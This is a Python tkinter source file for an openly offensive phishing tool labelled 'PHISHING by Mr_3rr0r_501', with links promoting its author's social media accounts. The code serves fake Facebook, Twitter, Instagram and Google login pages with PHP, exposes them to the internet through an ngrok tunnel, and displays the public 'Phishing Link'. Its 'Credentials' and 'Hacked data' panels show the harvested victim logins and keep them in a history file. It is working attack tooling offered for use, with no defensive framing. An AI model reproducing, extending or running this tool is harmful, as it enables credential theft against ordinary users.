#!/bin/python3

from tkinter import *
from tkinter import ttk
import tkinter as tk
from tkinter import messagebox
import os,time,subprocess
#from tkinter.ttk import *

#----------------------Funtion section--------------------------
count = 1
#------------------Start section-------------------
#Social Media links
def facebook():
    out = subprocess.call(["firefox","https://www.facebook.com/profile.php?id=100027796417995"])
    if(out == 0 ):
        print("----> Follow Me Facebook <-----")
    else:
        os.system("chromium --no-sandbox https://www.facebook.com/profile.php?id=100027796417995")
        print("----> Follow Me One Facebook <-----")
def instagram():
    out = subprocess.call(["firefox","https://www.instagram.com/p_h_y_200/"])
    if(out == 0 ):
        print("----> Follow Me On Instagram <-----")
    else:
        os.system("chromium --no-sandbox https://www.instagram.com/p_h_y_200/")
        print("----> Follow Me One Instagram <-----")
def twitter():
    out = subprocess.call(["firefox","https://twitter.com/yuvarajucet"])
    if(out == 0 ):
        print("----> Follow Me On Twitter <-----")
    else:
        os.system("chromium --no-sandbox https://twitter.com/yuvarajucet")
        print("----> Follow Me One Twitter <-----")
def youtube():
    out = subprocess.call(["firefox","https://www.youtube.com/channel/UCaGYX6OfIQuzlQs1cZWIT6Q"])
    if(out == 0 ):
        print("----> Subscribe to My Channel <-----")
    else:
        os.system("chromium --no-sandbox https://www.youtube.com/channel/UCaGYX6OfIQuzlQs1cZWIT6Q")
        print("----> Subscribe to my Channel <-----")
def github():
    out = subprocess.call(["firefox","https://github.com/yuvarajucet/"])
    if(out == 0 ):
        print("----> Follow me on Github <-----")
    else:
        os.system("chromium --no-sandbox https://github.com/yuvarajucet/")
        print("----> Follow Me On Github <-----")

def startserver():

    option = site.get()
    os.system("echo '' > $HOME/sites/log.txt")
    if option == 'Facebook':
        status.insert('end',"----------------------------\n")
        status.insert('end',"[+] Starting PHP Server...!\n")
        os.system("cd  ~/sites/Facebook && php -S 127.0.0.1:5555 > /dev/null 2>&1 &")
        os.system("sleep 1")
        status.insert('end',"[+] Starting NGROK Server for facebook..\n")
        out = os.system("ngrok http 5555 > /dev/null 2>&1 &")
        if out == 0:
            os.system("sleep 5")
            cmd = "curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'"
            global link
            link = subprocess.getoutput(cmd)
            
            linkfile = "cd $HOME/sites/ && echo "+link+" > .link.txt"
            os.system(linkfile)
            status.insert(END,"[+] Link is Ready.. :)\n")
            show()
        else:
            messagebox.showerror("Error", "NGROK Not found..!!!")
            status.insert(END,"\n[-] NGROK Not found!!!\n")
    elif option == 'Twitter':
        
        status.insert('end',"----------------------------\n")
        status.insert(INSERT,"[+] Starting PHP Server...!\n")
        os.system("cd ~/sites/Twitter && php -S 127.0.0.1:5555 > /dev/null 2>&1 &")
        os.system("sleep 2")
        status.insert('end',"[+] Starting NGROK Server for Twitter..\n")
        out = os.system("ngrok http 5555 > /dev/null 2>&1 &")
        if out == 0:
            os.system("sleep 5")
            cmd = "curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'"
            link = subprocess.getoutput(cmd)

            linkfile = "cd $HOME/sites/ && echo "+link+" > .link.txt"
            os.system(linkfile)

            status.insert(END,"[+] Link is Ready..:)\n")
            show()
        else:
            messagebox.showerror("Error", "NGROK Not found..!!!")
            status.insert(END,"\n[-] NGROK Not found!!!\n")
    elif option == 'Instagram':
        
        status.insert('end',"----------------------------\n")
        status.insert(INSERT,"[+] Starting PHP Server...!\n")
        os.system("cd ~/sites/Instagram && php -S 127.0.0.1:5555 > /dev/null 2>&1 &")
        os.system("sleep 2")
        status.insert('end',"[+] Starting NGROK Server for Instagram..\n")
        out = os.system("ngrok http 5555 > /dev/null 2>&1 &")
        if out == 0:
            os.system("sleep 5")
            cmd = "curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'"
            link = subprocess.getoutput(cmd)

            linkfile = "cd $HOME/sites/ && echo "+link+" > .link.txt"
            os.system(linkfile)

            status.insert(END,"[+] Link is Ready..:)\n")
            show()
        else:
            messagebox.showerror("Error", "NGROK Not found..!!!")
            status.insert(END,"\n[-] NGROK Not found!!!\n")
    elif option == 'Google':

        status.insert('end',"----------------------------\n")
        status.insert(INSERT,"[+] Starting PHP Server...!\n")
        os.system("cd ~/sites/Google && php -S 127.0.0.1:5555 > /dev/null 2>&1 &")
        os.system("sleep 2")
        status.insert('end',"[+] Starting NGROK Server for Google..\n")
        out = os.system("ngrok http 5555 > /dev/null 2>&1 &")
        if out == 0:
            os.system("sleep 5")
            cmd = "curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'https://[0-9a-z]*\.ngrok.io'"
            link = subprocess.getoutput(cmd)

            linkfile = "cd $HOME/sites/ && echo "+link+" > .link.txt"
            os.system(linkfile)
            
            status.insert(END,"[+] Link is Ready..:)\n")
            show()
        else:
            messagebox.showerror("Error", "NGROK Not found..!!!")
            status.insert(END,"\n[-] NGROK Not found!!!\n")
    else:
        messagebox.showwarning("Warning", "Please Select any website!!!") 
#-----show generated link..--------------
def show():
    val = StringVar()
    val.set(link)
    linklable = Label(frame,font=("Times",18,"bold"),text="Phishing Link :",bg='white',fg='green').place(x=0,y=100)
    text1 = Entry(frame,fg='blue',bg='white',textvar=val,width=30).place(x=200,y=100)
#---stop Ngrok Server and PHP server------
def stopserver():
    status.insert('end',"----------------------------\n")
    status.insert('end','[+] Stoping ngrok server..!\n')
    os.system("killall ngrok")
    status.insert('end','[+] Stoping PHP server..!\n')
    os.system("killall php")
    li = os.path.expanduser('~')
    lin = li+'/sites/.link.txt'
    os.system("echo '' > "+lin)
#----------------------creating panel and options-----------------------
def exitfun():
    print("Bye buddy..!! Meet you next time..:)")
    exit()
def start():
    #click=''
    global site
    global frame
    op = tk.StringVar()
    ll=StringVar()
    frame = tk.Frame(root,bg="white")
    frame.place(relwidth=1,relheight=0.7,rely=0.1)
    #add label
    label = Label(frame,text="Select Website:",bg='white').grid(column=0,row=2)
    site = ttk.Combobox(frame,width=27,textvar = op,state='readonly')
    site['values'] = ('Facebook',
                        'Twitter',
                        'Instagram',
                        'Google')
    site.grid(column=1,row=2)
    site.current(0)

    if(count == 1 ):
        print("")
    elif(count >= 2 ):
        linklable = Label(frame,font=("Times",18,"bold"),text="Phishing Link :",bg='white',fg='green').place(x=0,y=100)
        text1 = Entry(frame,fg='blue',bg='white',width=30,textvar=ll).place(x=200,y=100)
    
        li = os.path.expanduser('~')
        lin = li+'/sites/.link.txt'
        link = open(lin,'r')
        ll.set(link.read())

    startbtn = Button(frame,text="Start Server",bg='white',fg='green',activebackground='green',activeforeground='white',command=startserver).grid(column=3,row=2)
    stopbtn = Button(frame,text="Stop Server",bg="white",fg="red",activebackground="red",activeforeground="white",command=stopserver).grid(column=4,row=2)
    #show()

def cread():
    global count
    count+=1
    op = tk.StringVar()
    frame = tk.Frame(root,bg="white")
    frame.place(relwidth=1,relheight=0.7,rely=0.1)
    lable = Label(text="User Credentials",font=("courier",18,"bold"),bg='white',fg='black').place(x=300,y=80)
    credval = Text(frame,bg='black',fg='white',font=("courier",15,"bold"),width=100,height=30)
    credval.place(x=0,y=30)

    os.system("cat $HOME/sites/log.txt >> $HOME/sites/.history.txt")
    val = os.path.expanduser('~')
    file1 = val+"/sites/log.txt"
    re = open(file1,'r')
    credval.insert('end',re.read())

def logs():
    global count
    count+=1
    op = tk.StringVar()
    frame = tk.Frame(root,bg='white')
    frame.place(relwidth=1,relheight=0.7,rely=0.1)
    lable = Label(text="Hacked data",font=("courier",18,'bold'),bg="white",fg='black').place(x=300,y=80)
    historylog = Text(frame,bg='black',fg='green',font=('courier',15,'bold'),width=100,height=30)
    historylog.place(x=0,y=30)


    val = os.path.expanduser('~')
    file1 = val+"/sites/.history.txt"
    re = open(file1,'r')
    historylog.insert('end',re.read())

#----------------------Generation End------------------------


#Starting the program....................
root = Tk()
root.geometry("800x800")
root.resizable(width=False,height=False)
root.title("SocialMedia-Phising & PHY-Cybersec")
root.config(bg='green')
menubar = Menu(root)
canvas = Canvas(root,bg='green',width=300,height=300)
canvas.place(x=250,y=150)
#------------TOP Lable-----------------
toplable = Label(root,text="PHISHING by Mr_3rr0r_501",font=("serif",30,"underline"),bg='green',fg='yellow')
toplable.place(x=90,y=10)

#-----company logo-----
imgpath = os.path.expanduser('~')
imgpath1 = imgpath+"/sites/logo.png"
photo = PhotoImage(file = imgpath1)
canvas.create_image(0,0, anchor=NW,image=photo)

#-----------Social media icons----------------------
fbbtn = Button(root,text=" facebook ",fg='blue',bg='white',activebackground='blue',activeforeground='white',command=facebook).place(x=150,y=500)
instabtn = Button(root,text="Instagram",fg='red',bg='white',activebackground='red',activeforeground='white',command=instagram).place(x=250,y=500)
gitbtn = Button(root,text="   Github   ",fg='black',bg='white',activebackground='black',activeforeground='white',command=github).place(x=350,y=500)
twitbtn = Button(root,text="  Twitter   ",fg='cyan',bg='white',activebackground='cyan',activeforeground='white',command=twitter).place(x=450,y=500)
tubebtn = Button(root,text="Youtube",fg='red',bg='white',activebackground='red',activeforeground='white',command=youtube).place(x=550,y=500)

#-------------Status box----------------------
statuslabel = Label(text="Status:",font=("courier",20,"bold"),bg='green',fg='black').place(x=0,y=640)
status = Text(fg='green',bg='black',width=100,height=7)
status.place(x=0,y=670)
#-----------------------Menu BAR Items-----------------------
#first menu
homemenu = Menu(menubar,tearoff=0)
homemenu.add_command(label="Start",command=start)
homemenu.add_command(label="Credentials",command=cread)
homemenu.add_command(label="Logs",command=logs)
homemenu.add_separator()
homemenu.add_command(label="Exit",command=exitfun)
menubar.add_cascade(label="Home",menu=homemenu)

#attach menubar
root.config(menu=menubar)
#-----------------------------Menu Bar Items END----------------


#run
root.mainloop()
